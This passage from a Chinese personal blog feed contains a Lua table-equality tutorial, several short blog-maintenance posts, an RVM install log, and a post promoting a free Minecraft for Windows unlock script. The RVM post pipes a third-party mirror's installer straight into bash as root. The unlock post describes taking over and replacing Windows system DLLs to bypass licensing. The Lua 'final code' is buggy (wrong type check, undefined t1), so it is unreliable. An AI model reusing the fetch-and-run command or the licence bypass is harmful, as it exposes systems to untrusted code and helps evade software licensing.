href="#自己写判断" class="headerlink" title="自己写判断"></a>自己写判断</h2><p>于是，根据经过一段时间的琢磨，写出了这个 table 判断</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">table</span>.equal=<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(...)</span></span><br>  <span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">equal2</span><span class="hljs-params">(t1,t2)</span></span><br>    <span class="hljs-keyword">if</span> #t1~=#t2 <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(t1)<br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value)==<span class="hljs-string">&quot;table&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(t2[key])==<span class="hljs-string">&quot;table&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> equal2(value,t2[key])<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>        <span class="hljs-keyword">end</span><br>       <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">if</span> value~=t2[key]<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">for</span> eachKey,eachTable <span class="hljs-keyword">in</span> <span class="hljs-built_in">ipairs</span>&#123;...&#125;<br>    <span class="hljs-keyword">for</span> eachKey2,eachTable2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">ipairs</span>&#123;...&#125;<br>      <span class="hljs-keyword">if</span> eachKey~=eachKey2 <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> equal2(eachTable,eachTable2)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>主要实现逻辑是大函数里套了一个小函数，<strong>小函数只比较两个 table 是否一样，大函数接收不定量的若干个 table，然后两两配对给小函数去比较</strong></p><p>这里的两两配对是：</p><p><code>A - B - C</code></p><p><code>A-B, A-C, B-A, B-C, C-A, C-B</code></p><p>但这两两配对显然造成了资源的浪费，但即使不进行重复的比较，也会变成：</p><p><code>A-B, A-C, B-C</code></p><p>但既然已经 A-B, A-C 了，那 B 不是肯定等于 C 吗？于是把代码改成</p><details><summary>小函数同上面一样</summary><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">table</span>.equal=<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(...)</span></span><br>  <span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">equal2</span><span class="hljs-params">(t1,t2)</span></span><br>    <span class="hljs-keyword">if</span> #t1~=#t2 <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(t1)<br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value)==<span class="hljs-string">&quot;table&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(t2[key])==<span class="hljs-string">&quot;table&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> equal2(value,t2[key])<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>        <span class="hljs-keyword">end</span><br>       <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">if</span> value~=t2[key]<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure></details><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua">  <span class="hljs-keyword">for</span> _,eachTable <span class="hljs-keyword">in</span> <span class="hljs-built_in">ipairs</span>&#123;...&#125;<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> equal2(&#123;...&#125;[<span class="hljs-number">1</span>],eachTable) <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>这时的两两配对就变成了：</p><p><code>A-B, A-C</code></p><p>但这时我再去试试<a href="#重复比较两个 table">之前的</a>那个错误例子发现居然真的返回 true，可两个 table 明显不一样啊，照着他在小函数里加上</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(t2)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value)==<span class="hljs-string">&quot;table&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(t1[key])==<span class="hljs-string">&quot;table&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> equal2(value,t1[key])<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>   <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">if</span> value~=t1[key]<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>果然又可以了</p><p>在一位大佬的帮助下终于发现了问题。那两个 table 的长度不一样，正常情况下应该在第一步就抛出 false，可这里却没有</p><p>原来是因为 <strong>Lua 使用 # 获取 table 长度的时候是使用 iparse 实现</strong>，而这要求 table 的 key 从 1 开始，且是顺序递增的，否则就会在失去顺序的地方停止计数</p><p>这下就柳暗花明了。另外我还注意到 AndroLua 的 table 库还有个 table.size 的方法可以获取 table 的真实长度（parse）。不过原生 Lua 没有这个方法，我们可以自己实现一个，也不复杂：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">table</span>.size=<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(t)</span></span><br>  <span class="hljs-keyword">local</span> count = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(t) <span class="hljs-keyword">do</span> count = count + <span class="hljs-number">1</span> <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> count<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>然后将小函数中 # 获取 table 长度的部分换成 table.size</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">if</span> <span class="hljs-built_in">table</span>.size(t1)~=<span class="hljs-built_in">table</span>.size(t2) <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><p>整理一下，加入主动抛出错误的最终代码如下</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">-- AndroLua 中的 table.size 在原生 Lua 中不可用，所以自己实现一个</span><br><span class="hljs-comment">-- 用 AndroLua 的可以去掉</span><br><span class="hljs-built_in">table</span>.size=<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(t)</span></span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(<span class="hljs-built_in">table</span>)~=<span class="hljs-string">&quot;table&quot;</span> <span class="hljs-keyword">then</span> <span class="hljs-built_in">error</span>(<span class="hljs-string">&quot;bad argument #1 to &#x27;size&#x27; (table expected got &quot;</span>..<span class="hljs-built_in">type</span>(<span class="hljs-built_in">table</span>)..<span class="hljs-string">&quot;)&quot;</span>) <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">local</span> count=<span class="hljs-number">0</span><br>  <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(t) <span class="hljs-keyword">do</span> count=count + <span class="hljs-number">1</span> <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> count<br><span class="hljs-keyword">end</span><br><br><span class="hljs-built_in">table</span>.equal=<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(...)</span></span><br>  <span class="hljs-keyword">local</span> allTable=&#123;...&#125;<br>  <span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">equalTwo</span><span class="hljs-params">(t1,t2)</span></span><br>    <span class="hljs-keyword">if</span> t1==t2 <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span> <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">table</span>.size(t1)~=<span class="hljs-built_in">table</span>.size(t2) <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(t1) <span class="hljs-keyword">do</span><br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value)==<span class="hljs-string">&quot;table&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(t2[key])==<span class="hljs-string">&quot;table&quot;</span> <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> equalTwo(value,t2[key]) <span class="hljs-keyword">then</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>        <span class="hljs-keyword">end</span><br>       <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">if</span> value~=t2[key] <span class="hljs-keyword">then</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">for</span> index=<span class="hljs-number">2</span>,#allTable <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> equalTwo(allTable[<span class="hljs-number">1</span>],allTable[index]) <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> t2=&#123;<span class="hljs-number">1</span>,[<span class="hljs-number">3</span>]=<span class="hljs-number">2</span>,[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">3</span>&#125;,[<span class="hljs-string">&quot;5&quot;</span>]=<span class="hljs-number">4</span>,[<span class="hljs-string">&quot;6&quot;</span>]=&#123;&#123;&#123;<span class="hljs-string">&quot;5&quot;</span>&#125;&#125;&#125;&#125;<br><span class="hljs-keyword">local</span> t2=&#123;<span class="hljs-number">1</span>,[<span class="hljs-number">3</span>]=<span class="hljs-number">2</span>,[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">3</span>&#125;,[<span class="hljs-string">&quot;5&quot;</span>]=<span class="hljs-number">4</span>,[<span class="hljs-string">&quot;6&quot;</span>]=&#123;&#123;&#123;<span class="hljs-string">&quot;5&quot;</span>&#125;&#125;&#125;&#125;<br><span class="hljs-keyword">local</span> t3=&#123;<span class="hljs-number">1</span>,[<span class="hljs-number">3</span>]=<span class="hljs-number">2</span>,[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">3</span>&#125;,[<span class="hljs-string">&quot;5&quot;</span>]=<span class="hljs-number">4</span>,[<span class="hljs-string">&quot;6&quot;</span>]=&#123;&#123;&#123;<span class="hljs-string">&quot;5&quot;</span>&#125;&#125;&#125;&#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">table</span>.equal(t1,t2,t3))<br><br><span class="hljs-keyword">local</span> t1=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;<br><span class="hljs-keyword">local</span> t2=&#123;[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">table</span>.equal(t1,t2))<br><br><span class="hljs-comment">--主动抛出错误测试</span><br><span class="hljs-comment">--print(table.equal(t1,1,t2,t3))</span><br><span class="hljs-comment">--print(table.size(1))</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技术</tag>
      
      <tag>教程</tag>
      
      <tag>Lua</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态的状态应该要定下来了</title>
    <link href="/archives/4607b0ab/"/>
    <url>/archives/4607b0ab/</url>
    
    <content type="html"><![CDATA[<p>现在动态是放在动态的分类里，是文章的形式，但不在首页中显示，然后在首页上面放一个动态分类的快捷入口。好处是发出动态可以在 RSS 中显示，问题是每一条动态都是完整的文章，要有标题，内容也要点进去才能看，当然也有和文章一样的评论系统</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>部分图片迁移到七牛云</title>
    <link href="/archives/43682061/"/>
    <url>/archives/43682061/</url>
    
    <content type="html"><![CDATA[<p>现在在把博客部分图片从之前的 Gitlab 图床迁移到七牛云，还有<a href="https://github.com/jiesou/markor">我改的 Markor</a> Markdown 编辑器也支持把七牛云作为图床了<br>不得不说这七牛云真是狡诈，绑定域名的时候默认要绑定 CDN，然后告诉你 CDN 每月免费 10G 流量，但谁能想到这 10G 只支持 HTTP，HTTPS 要另外收费，吓得我赶紧把 CDN 删了.但 CDN 删了它就不没带宽告警了，没有带宽告警怕是给人刷流量了都不知道<br>我想来想去想说可以七牛云只是存储，然后套一个百度云加速，百度云加速也是免费的，而且我之前用过还行，速度差一点也问题不大。但是现在百度云加速我申请 SSL 证书它为什么说“当前操作已超过套餐限额“？？？我一个证书都没呢，SSL 证书都要收费了？？？希望只是系统维护有点异常吧<br>现在用的是之前七牛云注册的 SSL 下载下来自己部署到百度云加速了</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>说说再次调整，最近还在看怎么搞合适</title>
    <link href="/archives/dfad5606/"/>
    <url>/archives/dfad5606/</url>
    
    <content type="html"><![CDATA[<p>想了想就不弄什么 Artitalk 作为说说了，直接弄个 Markdown 页面作为说说吧，干净好看省事<br>Artitalk 那玩意又丑又垃圾，默认的配色像个烂橘子，样式也各种丑、花哨，还有个大大的头像，TM 这说说就固定的一个人发你要什么头像，我也懒得改 CSS 了，改也改不好。还用的自己一套独立的评论系统（而且说说要什么评论呢）</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>程序</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>又双叒叕更换了说说动态系统</title>
    <link href="/archives/499fdd1b/"/>
    <url>/archives/499fdd1b/</url>
    
    <content type="html"><![CDATA[<p>又双叒叕更换了说说&#x2F;动态系统 以前的内容放在了动态分类里</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/archives/4a17b156/"/>
    <url>/archives/4a17b156/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RVM 在中国的安装</title>
    <link href="/archives/816/"/>
    <url>/archives/816/</url>
    
    <content type="html"><![CDATA[<p>CentOS 7 服务器要用到 Rush，就装 <a href="http://rvm.io/">RVM</a></p><p>按道理安装应按很简单的，就两行命令<br>但输进命令行还是一堆问题，什么“curl: (35) Encountered end of file”巴拉拉的，反正是网络问题</p><p>折腾了一天，终于在 Github 找到了 <a href="https://github.com/Amberwudi/my_rvm_installer">Amberwudi&#x2F;my_rvm_installer</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">\[root@ ~\]# curl -sSL http://cdn.forqian.cn/rvm-installer.txt  bash -s stable<br>Downloading http://cdn.forqian.cn/blue\_dream\_tools/my\_rvm\_installer/1.29.12.tar.gz<br>Downloading http://cdn.forqian.cn/blue\_dream\_tools/my\_rvm\_installer/1.29.12.tar.gz.asc<br>gpg: Signature made Sat 16 Jan 2021 02:46:22 AM CST using RSA key ID 39499BDB<br>gpg: Good signature from <span class="hljs-string">&quot;Piotr Kuczynski &lt;piotr.kuczynski@gmail.com&gt;&quot;</span><br>gpg: WARNING: This key is not certified with a trusted signature!<br>gpg:          There is no indication that the signature belongs to the owner.<br>Primary key fingerprint: 7D2B AF1C F37B 13E2 069D  6956 105B D0E7 3949 9BDB<br>GPG verified <span class="hljs-string">&#x27;/usr/local/rvm/archives/rvm-1.29.12.tgz&#x27;</span><br>Upgrading the RVM installation <span class="hljs-keyword">in</span> /usr/local/rvm/<br>Upgrade of RVM <span class="hljs-keyword">in</span> /usr/local/rvm/ is complete.<br>  \* Please <span class="hljs-keyword">do</span> NOT forget to add your <span class="hljs-built_in">users</span> to the rvm group.<br>     The installer no longer auto-adds root or <span class="hljs-built_in">users</span> to the rvm group. Admins must <span class="hljs-keyword">do</span> this.<br>     Also, please note that group memberships are ONLY evaluated at login <span class="hljs-keyword">time</span>.<br>     This means that <span class="hljs-built_in">users</span> must <span class="hljs-built_in">log</span> out <span class="hljs-keyword">then</span> back <span class="hljs-keyword">in</span> before group membership takes effect!<br><br>Thanks <span class="hljs-keyword">for</span> installing RVM 🙏<br>Please consider donating to our open collective to <span class="hljs-built_in">help</span> us maintain RVM.<br><br>👉  Donate: https://opencollective.com/rvm/donate<br></code></pre></td></tr></table></figure><p>感谢这位 <a href="https://github.com/Amberwudi">Amberwudi</a> ！！！</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[MFWL]免费解锁 Minecraft for Windows （MCBE）一键脚本更新</title>
    <link href="/archives/764/"/>
    <url>/archives/764/</url>
    
    <content type="html"><![CDATA[<p>在<a href="https://www.jiecs.top/archives/42">很久之前</a>我其实已经做了一个免费解锁 Minecraft for Windows 的一键脚本，其实比你现在 Github 等地方搜到的脚本都要早，之前是 2021-07-11</p><p>时隔半年现在来更新一下这个脚本<br>也是看到了<a href="https://www.jiecs.top/archives/42#comment-68">这个评论</a>才想起我还有这个东西</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="http://ctpan.jiecs.top/f/32856022-540848979-692448">城通网盘</a> <a href="https://wss1.cn/f/7hl47fat6vi">文叔叔</a> <a href="https://github.com/jiesou/MFWL-Minecraft-For-Windows-Unlock-Launcher">Github</a>（1.85 MB 三个脚本 附带图标和全部需要的资源）</p><p>就是个简单的 BAT 脚本，运行很快，文件也很小，比那些 EXE 高的不知道哪里去了</p><p>千万不要在压缩包中打开脚本并解锁，需要完整解压后再打开。否则会损坏系统文件！！！<br>千万不要在临时目录下打开脚本并解锁。会损坏系统文件！！！<br>千万不要删掉、移走目录下的资源文件（bRes）后解锁，会损坏系统文件！！！</p><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>极其详细的视频教程：<a href="https://b23.tv/av678704109">哔哩哔哩</a></p><p>文件结构和<a href="https://www.jiecs.top/archives/42?_pro=v2:26:0.545:0.457">之前</a>其实差不多<br>要先安装 Minecraft for Windows 的试玩版<br>操作也很简单，打开 Unlock.bat 照着说明就行。但千万要把每段说明都看清楚并理解，否则可能会破环系统文件等</p><h2 id="更新内容"><a href="#更新内容" class="headerlink" title="更新内容"></a>更新内容</h2><h3 id="启动时的环境检测"><a href="#启动时的环境检测" class="headerlink" title="启动时的环境检测"></a>启动时的环境检测</h3><p>其实就是检测管理员权限有没有开，还有 Minecraft 是不是正在运行（在运行的时候不能操作解锁）</p><p><img src="https://s4.ax1x.com/2022/01/26/7OFTXT.png" alt="检测管理员权限"></p><h3 id="双解锁方案"><a href="#双解锁方案" class="headerlink" title="双解锁方案"></a>双解锁方案</h3><p>现在常规的解锁 Minecraft for Windows 主要有这么两种方法</p><p>（其实这两种方法都是这个 <a href="https://www.youtube.com/channel/UCgaludRTCVuByNy6Gx7AknQ">M Centres</a> 大佬发布的）</p><p><strong>替换系统 DLL 文件 - <a href="https://youtu.be/im70pl_1Rpg">Youtube</a></strong></p><ul><li>可能对系统版本有要求，最好大于等于 Windows10 1909（19H2&#x2F;KB5004926&#x2F;18362.446）</li><li>权限要求比较高</li></ul><p><strong>添加注册表并停止服务 - <a href="https://youtu.be/sPGVLC5GWGI">Youtube</a></strong></p><ul><li>系统最好不要是精简优化版，停止服务可能影响较大</li><li>无法在游戏中打开充值 Minecoins 跳转窗口</li><li>解锁后 Microsoft Store 下载不了程序，除非取消解锁（PlanB UnlockLauncher.bat 就是仅在运行 MC 时解锁，退出 MC 就恢复）</li><li>每次启动游戏需要手动结束 Runtime Broker.exe 进程，或者用专门的启动器（就是 PlanB Launcher.bat）</li></ul><p>在 Unlock.bat 里，这两个方案都集成了，对应的是方案 A 和 B。还会根据系统环境自动建议适合的方案</p><p><img src="https://s4.ax1x.com/2022/01/26/7OkauT.png" alt="自动建议适合的取消解锁方案"></p><p><strong>方案 A（替换 DLL）脚本的具体操作是这样</strong></p><ol><li>备份 DLL 现在的权限信息放到临时文件（.temp）</li><li>获取文件权限（先得到所有者再授予完全控制）</li><li>操作 DLL 文件（比如重命名备份，然后复制进去替换</li><li>从临时文件里恢复之前的权限信息（但所有者没法恢复回去，你可以自己恢复回去给”NT SERVICE\TrustedInstaller“，当然不恢复也没事）</li></ol>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>Minecraft</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AndroLua 反编译与 Lua 反函数序列化</title>
    <link href="/archives/748/"/>
    <url>/archives/748/</url>
    
